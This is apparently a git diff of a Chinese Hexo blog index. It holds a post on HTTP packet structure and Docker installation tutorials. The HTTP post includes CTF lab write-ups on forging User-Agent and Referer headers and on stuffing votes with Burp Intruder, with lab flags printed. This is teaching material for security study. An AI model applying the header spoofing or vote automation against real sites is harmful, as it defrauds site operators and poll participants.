+<h3 id="6-2-3-来源页伪造"><a href="#6-2-3-来源页伪造" class="headerlink" title="6.2.3 来源页伪造"></a>6.2.3 来源页伪造</h3><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630591766174-e29a1e9f-516a-4436-83ec-c788d848c31c.png" alt="image.png"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630591810029-707a9611-66fd-4536-9711-0851586bcd0f.png" alt="image.png"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630591825055-86ab59d0-0a3f-406b-8314-91f23dbe472e.png" alt="image.png"></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
       </tags>
   </entry>
   <entry>
@@ -1352,145 +1490,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Web数据包拓展</title>
-    <url>/post/488cc6a6.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、网站解析对应"><a href="#一、网站解析对应" class="headerlink" title="一、网站解析对应"></a>一、网站解析对应</h1><p>&emsp;&emsp;涉及到的攻击层面？（源码，搭建平台，系统，网络层等） </p>
-<p>&emsp;&emsp;涉及到的安全问题？（目录，敏感文件，弱口令，IP 及域名等）  </p>
-<h1 id="二、HTTP-HTTPS数据包"><a href="#二、HTTP-HTTPS数据包" class="headerlink" title="二、HTTP/HTTPS数据包"></a>二、HTTP/HTTPS数据包</h1><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630581800265-8a77b9ec-0619-4cec-914d-705eaad8f74e.png" alt="image.png"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630582307082-e666f24e-a7ac-4d99-b3df-abdaa21068c7.png" alt="image.png"></p>
-<h1 id="三、HTTP-HTTPS具体区别"><a href="#三、HTTP-HTTPS具体区别" class="headerlink" title="三、HTTP/HTTPS具体区别"></a>三、HTTP/HTTPS具体区别</h1><h2 id="3-1-HTTP简要通信过程"><a href="#3-1-HTTP简要通信过程" class="headerlink" title="3.1 HTTP简要通信过程"></a>3.1 HTTP简要通信过程</h2><p>&emsp;&emsp;建立连接–&gt;发送请求数据包–&gt;返回相应数据包–&gt;关闭连接</p>
-<ol>
-<li>浏览器建立与Web服务器之间的连接</li>
-<li>浏览器将请求数据打包（生成请求数据包）并发送到Web服务器</li>
-<li>Web服务器将处理结果打包（生成相应数据包）并发送给浏览器</li>
-<li>Web服务器关闭连接</li>
-</ol>
-<h2 id="3-2-HTTPS简要通信过程（见图）"><a href="#3-2-HTTPS简要通信过程（见图）" class="headerlink" title="3.2 HTTPS简要通信过程（见图）"></a>3.2 HTTPS简要通信过程（见图）</h2><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630582387031-e39f1241-1f9b-4aaf-9c68-e07123f7b7a7.png" alt="image.png"></p>
-<h1 id="四、Request请求数据包数据格式"><a href="#四、Request请求数据包数据格式" class="headerlink" title="四、Request请求数据包数据格式"></a>四、Request请求数据包数据格式</h1><ul>
-<li><p>请求行：请求类型/请求资源路径、版本的协议和类型</p>
-</li>
-<li><p>请求头：一些键值对，浏览器与Web服务器之间都可以发送，特定的某种含义</p>
-</li>
-<li><p>空行：请求头与请求体之间用一个空行隔开</p>
-</li>
-<li><p>请求体：要发送的数据（一般POST提交会使用）；例：user=123&amp;pas=123</p>
-</li>
-</ul>
-<p>例：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Request Headers</span><br><span class="line">POST /adduser HTTP/1.1</span><br><span class="line">Host: localhost:8030</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 16</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Origin: chrome-extension://fdmmgilgnpjigdojojpjoooidkmcomcm</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)</span><br><span class="line">Chrome/66.0.3359.181 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line"># Form Data</span><br><span class="line">name=name&amp;age=11</span><br></pre></td></tr></table></figure>
-
-<h2 id="4-1-请求行"><a href="#4-1-请求行" class="headerlink" title="4.1 请求行"></a>4.1 请求行</h2><p>&emsp;&emsp;请求行由三个标记组成：请求方法、请求 URL 和 HTTP 版本，它们用空格分隔</p>
-<p>&emsp;&emsp;例如：GET /index.html HTTP/1.1  </p>
-<p>&emsp;&emsp;HTTP规划定义了8种可能的请求方法：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET：检索URL中标识资源的一个简单请求</span><br><span class="line">HEAD：与GET方法相同，服务器只返回状态行和头标，并不返回请求文档</span><br><span class="line">POST：服务器接收被写入客户端输出流中的数据的请求</span><br><span class="line">PUT：服务器保存请求数据作为指定URL新内容的请求</span><br><span class="line">DELETE：服务器删除URL中命令的资源的请求</span><br><span class="line">OPTIONS：关于服务器支持的请求方法信息的请求</span><br><span class="line">TRACE：Web服务器反馈HTTP请求和其头标的请求</span><br><span class="line">CONNECT：已文档化，但当前未实现的一个方法，预留做隧道处理</span><br></pre></td></tr></table></figure>
-
-<h2 id="4-2-请求头"><a href="#4-2-请求头" class="headerlink" title="4.2 请求头"></a>4.2 请求头</h2><p>由关键字/值对组成，每行一对，关键字和值用冒号分隔。请求头标通知服务器腾于客户端的功能和标识。</p>
-<ul>
-<li><strong>HOST:</strong> 主机或域名地址 </li>
-<li><strong>Accept：</strong>指浏览器或其他客户可以接受的 MIME 文件格式。Servlet 可以根据它判断并返回适当的文件格 式。 </li>
-<li><strong>User-Agent：</strong>是客户浏览器名称 </li>
-<li><strong>Host：</strong>对应网址 URL 中的 Web 名称和端口号。 </li>
-<li><strong>Accept-Langeuage：</strong>指出浏览器可以接受的语言种类，如 en 或 en-us，指英语。 </li>
-<li><strong>Connection：</strong>用来告诉服务器是否可以维持固定的 HTTP 连接。<strong>HTTP 是无连接的</strong>，HTTP/1.1 使用 Keep-Alive 为默认值，这样，当浏览器需要多个文件时（比如一个 HTML 文件和相关的图形文件），不需要每次都建立连接 </li>
-<li><strong>Cookie：</strong>浏览器用这个属性向服务器发送 Cookie。Cookie 是在浏览器中寄存的小型数据体，它可以记载和服务器相关的用户信息，也可以用来实现会话功能。 </li>
-<li><strong>X-Forwarded-For：</strong>是用于记录代理信息的，每经过一级代理(匿名代理除外)，代理服务器都会把这次请求的来源IP追加在X-Forwarded-For中</li>
-<li><strong>X-Real-IP：</strong>一般只记录真实发出请求的客户端IP</li>
-<li><strong>Referer：</strong>表明产生请求的网页URL。如比从网页 <a href="/icconcept/index.jsp">/icconcept/index.jsp</a> 中点击一个链接到网页 <a href="/icwork/search">/icwork/search</a> ，在向服务器发送的 GET /icwork/search 中的请求中，Referer是 <a href="http://hostname:8080/icconcept/index.jsp">http://hostname:8080/icconcept/index.jsp</a> ，这个属性可以用来跟踪Web请求是从什么网站来的。（比如一些邀请链接就是通过Referer头来判别走的是谁的邀请，购买了什么商品，对邀请人进行奖励）</li>
-<li><strong>Content-Type：</strong>用来表明 Request 的内容类型。可以用 HttpServletRequest 的 getContentType()方法取得。 </li>
-<li><strong>Accept-Charset：</strong>指出浏览器可以接受的字符编码。英文浏览器的默认值是 ISO-8859-1. </li>
-<li><strong>Accept-Encoding：</strong>指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加速文件传递速度。浏览器在接收到 Web 响应之后先解码，然后再检查文件格式。</li>
-<li><strong>空行：</strong>最后一个请求头标之后是空行，发送回车符和退行，通知服务器以下不再有头标。 </li>
-<li><strong>请求数据：</strong>使用 POST 传送，最常使用的是 Content-Type 和 Content-Length 头标。</li>
-</ul>
-<h1 id="五、Respones返回数据包数据格式"><a href="#五、Respones返回数据包数据格式" class="headerlink" title="五、Respones返回数据包数据格式"></a>五、Respones返回数据包数据格式</h1><p>​    一个响应由四个部分组成：状态行、响应头标、空行、响应数据。 </p>
-<ul>
-<li><p><strong>状态行：</strong>协议版本、数字形式的状态代码和状态描述，每个元素之间以空格分隔 </p>
-</li>
-<li><p><strong>响应头标：</strong>包含服务器类型、日期、长度、内容类型等 </p>
-</li>
-<li><p><strong>空行：</strong>响应头与响应体之间用空行隔开 </p>
-</li>
-<li><p><strong>响应数据：</strong>浏览器会将实体内容中的数据取出来，生成相应的页面</p>
-</li>
-</ul>
-<ul>
-<li><p>HTTP 响应码： </p>
-<ul>
-<li><strong>1xx：</strong>信息，请求收到，继续处理 </li>
-<li><strong>2xx：</strong>成功，行为被成功地接受、理解和采纳 </li>
-<li><strong>3xx：</strong>重定向，为了完成请求，必须进一步执行的动作 </li>
-<li><strong>4xx：</strong>客户端错误 </li>
-<li><strong>5xx：</strong>服务器错误</li>
-</ul>
-<p>判断文件（夹）是否存在</p>
-<ul>
-<li><p><strong>200</strong> 存在文件</p>
-</li>
-<li><p><strong>3xx</strong> 均可能存在</p>
-</li>
-<li><p><strong>403</strong> 存在文件夹</p>
-</li>
-</ul>
-<ul>
-<li><strong>404</strong> 不存在文件及文件夹</li>
-<li><strong>500</strong> 均可能存在</li>
-<li>因此在扫描网站后台时最好这三个选项都选上</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630582387031-e39f1241-1f9b-4aaf-9c68-e07123f7b7a7.png" alt="image.png"></p>
-<ul>
-<li><p>响应头标：像请求头标一样，它们指出服务器的功能，标识出响应数据的细节</p>
-</li>
-<li><p>空行：最后一个响应头标之后是一个空行，发送回车符和退行，表明服务器以下不再有头标</p>
-</li>
-<li><p>响应数据：HTML文档和图像等，也就是HTML本身</p>
-</li>
-</ul>
-<h1 id="六、例子"><a href="#六、例子" class="headerlink" title="六、例子"></a>六、例子</h1><h2 id="6-1-第三方检测修改实现XSS攻击"><a href="#6-1-第三方检测修改实现XSS攻击" class="headerlink" title="6.1 第三方检测修改实现XSS攻击"></a>6.1 第三方检测修改实现XSS攻击</h2><p>&emsp;&emsp;之前某长之家的IP查询功能页面，因为会通过数据包获取User-Agent信息并显示在网页上，而没有采取防御措施，因此有XSS漏洞，目前已修复</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211204002740481.png" alt="image.png"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211204002715493.png" alt="image.png"></p>
-<h2 id="6-2-CTF或实际应用中部分考题解析（mozhe）"><a href="#6-2-CTF或实际应用中部分考题解析（mozhe）" class="headerlink" title="6.2 CTF或实际应用中部分考题解析（mozhe）"></a>6.2 CTF或实际应用中部分考题解析（mozhe）</h2><h3 id="6-2-1-浏览器信息伪造"><a href="#6-2-1-浏览器信息伪造" class="headerlink" title="6.2.1 浏览器信息伪造"></a>6.2.1 浏览器信息伪造</h3><p>&emsp;&emsp;背景介绍：小墨了解到从微信6.0开始，其内嵌的浏览器在User Agent字符串中增加了NetType字段用于标识客户端（手机）当前的网络环境，增加之后真的安全吗？  </p>
-<p>&emsp;&emsp;解题方向： 根据页面提示，抓包分析除了判断浏览器类型还判断了微信特有的NetType</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630590160405-96a77c4a-04ad-4e78-acde-7f1480360654.png" alt="image.png"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211204002943832.png" alt="image.png"></p>
-<p>&emsp;&emsp;查阅资料发现符合的User-Agent：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12A365 MicroMessenger/6.0 NetType/2G</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630589984309-a1cd1d42-e840-44d5-84a2-658bec61ac0a.png" alt="image.png"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630590246964-dec0cada-67e8-458f-ab15-e1d49724dee9.png" alt="image.png"></p>
-<p>&emsp;&emsp;KEY： mozhe1540417e23d339b162b1bbe84c9  </p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630590449601-6395ce00-5d15-426a-b139-f8917fa52c4c.png" alt="image.png"></p>
-<h3 id="6-2-2-投票常见漏洞分析溯源"><a href="#6-2-2-投票常见漏洞分析溯源" class="headerlink" title="6.2.2 投票常见漏洞分析溯源"></a>6.2.2 投票常见漏洞分析溯源</h3><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630590610448-8bf38ef9-d69a-4b0c-998d-378938d39a30.png" alt="image.png"></p>
-<p>&emsp;&emsp;随便投一票，发现说要微信打开</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630591209350-92ed9d7b-639f-4af2-9094-7d3466aa7e6d.png" alt="image.png"></p>
-<p>&emsp;&emsp;查阅资料知道微信的User-agent有：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mozilla/5.0 (Linux; U; Android 5.0.2; zh-cn; MI 2C Build/LRX22G) AppleWebKit/533.1 (KHTML, like Gecko)Version/4.0 MQQBrowser/5.4 TBS/025469 Mobile Safari/533.1 MicroMessenger/6.2.5.53_r2565f18.621 NetType/WIFI Language/zh_CN</span><br></pre></td></tr></table></figure>
-
-<p>&emsp;&emsp;使用微信的User-Agent后，投票成功</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630591250818-899f9e23-1511-4cce-8fd7-beeb6c132c3f.png" alt="image.png"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211204003313408.png" alt="image.png"></p>
-<p>&emsp;&emsp;使用Repeater再次进行一遍，无误</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630591402410-b006ecb0-f7b6-446c-9c7e-02925c77914d.png" alt="image.png"></p>
-<p>&emsp;&emsp;使用Intruder疯狂投票吧！</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630591464881-f13c8d47-dc96-4e02-8da3-b7f6ac4d5ebb.png" alt="image.png"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630591492701-8436708a-4bd7-4225-94a5-8a3f1b329b9b.png" alt="image.png"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630591511008-c4262ba6-2bbd-4cbb-a82d-5c96faf11b19.png" alt="image.png"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630591524853-d073c65c-bd75-45d2-935f-0df67fa822cf.png" alt="image.png"></p>
-<p>&emsp;&emsp;差不多就可以停了，KEY：mozhece264154fdee3bfe3040b0c3ba1</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630591573893-8d4ed94e-a54a-4043-91f4-0be0ed4b3f76.png" alt="image.png"></p>
-<h3 id="6-2-3-来源页伪造"><a href="#6-2-3-来源页伪造" class="headerlink" title="6.2.3 来源页伪造"></a>6.2.3 来源页伪造</h3><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630591766174-e29a1e9f-516a-4436-83ec-c788d848c31c.png" alt="image.png"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630591810029-707a9611-66fd-4536-9711-0851586bcd0f.png" alt="image.png"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630591825055-86ab59d0-0a3f-406b-8314-91f23dbe472e.png" alt="image.png"></p>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-      </categories>
-      <tags>
-        <tag>Web安全</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Web源码拓展</title>
     <url>/post/de8a59bf.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>&emsp;&emsp;WEB 源码在安全测试中是非常重要的信息来源，可以用来代码审计漏洞也可以用来做信息突破口，其中 WEB 源码有很多技术需要简明分析。 比如：获取某 ASP 源码后可以采用默认数据库下载为突破，获取某其他脚本源码漏洞可以进行代码审计挖掘或分析其业务逻辑等，总之源码的获取将为后期的安全测试提供了更多的思路。</p>
@@ -1617,74 +1616,6 @@
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">启动一个默认的docker</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">发现这个默认的tomcat是没有webapps应用，镜像的原因，官方的镜像默认webapps下面是没有文件的</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">我自己从webapps.dist拷贝进webapps了基本文件</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">将我们操作过的容器通过commit提交为一个镜像！我们以后就使用我们修改过的镜像即可</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630460544134-55c5eda4-78b6-4871-b1e4-7954128009ec.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>docker</category>
-      </categories>
-      <tags>
-        <tag>docker</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>docker安装</title>
-    <url>/post/327177db.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、Docker的基本组成"><a href="#一、Docker的基本组成" class="headerlink" title="一、Docker的基本组成"></a>一、Docker的基本组成</h1><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630189658121-fda48094-6318-4c60-b251-4e740542c1fc.png" alt="img"></p>
-<p><strong>1、镜像（image）：</strong></p>
-<p>&emsp;&emsp;Docker镜像就好比是一个模板，可以通过这个模板来创建容器服务，Tomcat镜像==&gt;run==&gt;Tomecat01容器（提供服务），通过这个镜像可以创建多个容器（最终服务或者项目运行就是在容器中的</p>
-<p><strong>2、容器（container）：</strong></p>
-<p>&emsp;&emsp;通过镜像来创建的</p>
-<p>&emsp;&emsp;Docker利用容器技术，独立运行一个或者一组应用</p>
-<p>&emsp;&emsp;目前就可以把这个容器理解为就是一个简易的Linux系统</p>
-<p><strong>3、仓库（repository）：</strong></p>
-<p>&emsp;&emsp;仓库就是存放镜像的地方</p>
-<p>&emsp;&emsp;仓库分为公有仓库和私有仓库</p>
-<h1 id="二、安装Docker"><a href="#二、安装Docker" class="headerlink" title="二、安装Docker"></a>二、安装Docker</h1><h2 id="1、环境准备"><a href="#1、环境准备" class="headerlink" title="1、环境准备"></a>1、环境准备</h2><ul>
-<li><p>需要Linux基础</p>
-</li>
-<li><p>CentOS7</p>
-</li>
-<li><p>使用XShell等连接远程服务器进行操作</p>
-</li>
-</ul>
-<h2 id="2、环境查看"><a href="#2、环境查看" class="headerlink" title="2、环境查看"></a>2、环境查看</h2><p>&emsp;&emsp;<code>uname -r</code>     #可以看到系统内核是3.0以上的（根据目前最新版本的Docker最好用3.0以上的）</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630190998027-5178b78c-86a9-4d77-9e6d-58e9c47ef1bc.png" alt="img"></p>
-<p>&emsp;&emsp;<code>cat /etc/os-release</code>    #操作系统版本等信息，可以看到为CentOS7</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630191045289-d8e49bd7-1e5f-445e-8a15-887b4c23a23a.png" alt="img"></p>
-<h2 id="3、安装"><a href="#3、安装" class="headerlink" title="3、安装"></a>3、安装</h2><p>&emsp;&emsp;查看帮助文档</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630191257923-ca08032d-432d-453b-b306-0536f273e86d.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630191291748-ec54e317-e612-4404-a188-93e32caba267.png" alt="img"></p>
-<h3 id="（1）卸载旧的版本"><a href="#（1）卸载旧的版本" class="headerlink" title="（1）卸载旧的版本"></a>（1）卸载旧的版本</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum remove docker \</span><br><span class="line">                  docker-client \</span><br><span class="line">                  docker-client-latest \</span><br><span class="line">                  docker-common \</span><br><span class="line">                  docker-latest \</span><br><span class="line">                  docker-latest-logrotate \</span><br><span class="line">                  docker-logrotate \</span><br><span class="line">                  docker-engine</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630191459582-c6298c53-8019-49e0-aa05-3ed98add9b91.png" alt="img"></p>
-<h3 id="（2）需要的安装包"><a href="#（2）需要的安装包" class="headerlink" title="（2）需要的安装包"></a>（2）需要的安装包</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum install -y yum-utils</span><br></pre></td></tr></table></figure>
-
-<h3 id><a href="#" class="headerlink" title></a><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630192978202-9ea6b98b-6354-41dc-83cb-8a668a6fe77f.png" alt="img"></h3><h3 id="（3）设置镜像的仓库"><a href="#（3）设置镜像的仓库" class="headerlink" title="（3）设置镜像的仓库"></a>（3）设置镜像的仓库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum-config-manager \</span><br><span class="line">    --add-repo \</span><br><span class="line">    https://download.docker.com/linux/centos/docker-ce.repo   #默认是国外的</span><br><span class="line"><span class="meta">#</span><span class="bash">建议用国内的，这里用了阿里云的</span></span><br><span class="line">sudo yum-config-manager \</span><br><span class="line">    --add-repo \</span><br><span class="line">    http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630193327326-54bbb9ee-11b0-4d51-bd3e-0dfd8b5207ba.png" alt="img"></p>
-<h3 id="（4）更新yum软件包索引（文档并没有，但是推荐先这样做）"><a href="#（4）更新yum软件包索引（文档并没有，但是推荐先这样做）" class="headerlink" title="（4）更新yum软件包索引（文档并没有，但是推荐先这样做）"></a>（4）更新yum软件包索引（文档并没有，但是推荐先这样做）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum makecache fast</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630193742930-52d2c07c-00a5-44b7-a3d6-608b84ca0bbd.png" alt="img"></p>
-<h3 id="（5）安装Docker相关依赖（docker-ce-社区版-ee-企业版）"><a href="#（5）安装Docker相关依赖（docker-ce-社区版-ee-企业版）" class="headerlink" title="（5）安装Docker相关依赖（docker-ce 社区版  ee 企业版）"></a>（5）安装Docker相关依赖（docker-ce 社区版  ee 企业版）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum install docker-ce docker-ce-cli containerd.io</span><br><span class="line"><span class="meta">#</span><span class="bash">可以使用docker version命令查看是否安装成功</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630193895408-06452251-6f2b-4b08-a74b-58df248e2597.png" alt="img"></p>
-<h3 id="（6）启动Docker"><a href="#（6）启动Docker" class="headerlink" title="（6）启动Docker"></a>（6）启动Docker</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>
-
-<h3 id="（7）运行hello-world"><a href="#（7）运行hello-world" class="headerlink" title="（7）运行hello-world"></a>（7）运行hello-world</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630194278515-365cb481-1185-4483-a8bf-4d29f18e2ffa.png" alt="img"></p>
-<h3 id="（8）查看下载的hello-world镜像"><a href="#（8）查看下载的hello-world镜像" class="headerlink" title="（8）查看下载的hello-world镜像"></a>（8）查看下载的hello-world镜像</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker images   </span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630194342773-168e10b3-0461-4293-8147-a4c3b044dc3f.png" alt="img"></p>
-<h2 id="4、卸载Docker（了解）"><a href="#4、卸载Docker（了解）" class="headerlink" title="4、卸载Docker（了解）"></a>4、卸载Docker（了解）</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1、卸载依赖</span></span><br><span class="line">sudo yum remove docker-ce docker-ce-cli containerd.io</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 2、删除资源</span></span><br><span class="line">sudo rm -rf /var/lib/docker   # /var/lib/docker 为Docker的默认工作路径</span><br></pre></td></tr></table></figure>
-
-<h1 id="三、回顾hello-world流程"><a href="#三、回顾hello-world流程" class="headerlink" title="三、回顾hello-world流程"></a>三、回顾hello-world流程</h1><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630195539318-3872e867-2f1d-4109-8891-81ca87e72d0e.png" alt="img"></p>
-<h1 id="四、底层原理"><a href="#四、底层原理" class="headerlink" title="四、底层原理"></a>四、底层原理</h1><h2 id="1、Docker是怎么工作的"><a href="#1、Docker是怎么工作的" class="headerlink" title="1、Docker是怎么工作的"></a>1、Docker是怎么工作的</h2><p>&emsp;&emsp;Docker是一个Client-Server结构的系统，Docker的守护进程运行在主机上，通过Socket从客户端访问。</p>
-<p>&emsp;&emsp;DockerServer接收到Docker-Client的指令，就会执行这个命令</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630196704765-f6761549-9aca-4a85-b1b8-6ba89161125a.png" alt="img"></p>
-<h2 id="2、Docker为什么比VM快"><a href="#2、Docker为什么比VM快" class="headerlink" title="2、Docker为什么比VM快"></a>2、Docker为什么比VM快</h2><p>&emsp;&emsp;Docker有着比虚拟机更少的抽象层</p>
-<p>&emsp;&emsp;Docker利用的是宿主机的内核，VM需要是Guset OS</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630197561993-9b8796b3-5854-4163-a8a5-c5ee38d9caba.jpeg" alt="img"></p>
-<p>&emsp;&emsp;所以说，新建一个容器的时候，docker不需要像虚拟机一样重新加载一个操作系统内核，避免引导。虚拟机是加载Guest OS，分钟级别的，而Docker是利用宿主机的操作系统，省略了这个复杂的过程，秒级！</p>
 ]]></content>
       <categories>
         <category>docker</category>
@@ -1937,53 +1868,72 @@
       </tags>
   </entry>
   <entry>
-    <title>docker镜像讲解</title>
-    <url>/post/9e39f1c0.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、镜像是什么"><a href="#一、镜像是什么" class="headerlink" title="一、镜像是什么"></a>一、镜像是什么</h1><p>&emsp;&emsp;镜像是一种轻量级、可执行的独立软件包，用来打包软件运行环境和基于运行环境开发的软件，它包含运行某个软件所需的所有内容，包括代码、运行时、库、环境变量和配置文件。</p>
-<p>&emsp;&emsp;所有的应用，直接打包docker镜像，就可以直接跑起来</p>
-<p>&emsp;&emsp;如何得到镜像：</p>
-<ul>
-<li><p>从远程仓库下载</p>
+    <title>docker安装</title>
+    <url>/post/327177db.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、Docker的基本组成"><a href="#一、Docker的基本组成" class="headerlink" title="一、Docker的基本组成"></a>一、Docker的基本组成</h1><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630189658121-fda48094-6318-4c60-b251-4e740542c1fc.png" alt="img"></p>
+<p><strong>1、镜像（image）：</strong></p>
+<p>&emsp;&emsp;Docker镜像就好比是一个模板，可以通过这个模板来创建容器服务，Tomcat镜像==&gt;run==&gt;Tomecat01容器（提供服务），通过这个镜像可以创建多个容器（最终服务或者项目运行就是在容器中的</p>
+<p><strong>2、容器（container）：</strong></p>
+<p>&emsp;&emsp;通过镜像来创建的</p>
+<p>&emsp;&emsp;Docker利用容器技术，独立运行一个或者一组应用</p>
+<p>&emsp;&emsp;目前就可以把这个容器理解为就是一个简易的Linux系统</p>
+<p><strong>3、仓库（repository）：</strong></p>
+<p>&emsp;&emsp;仓库就是存放镜像的地方</p>
+<p>&emsp;&emsp;仓库分为公有仓库和私有仓库</p>
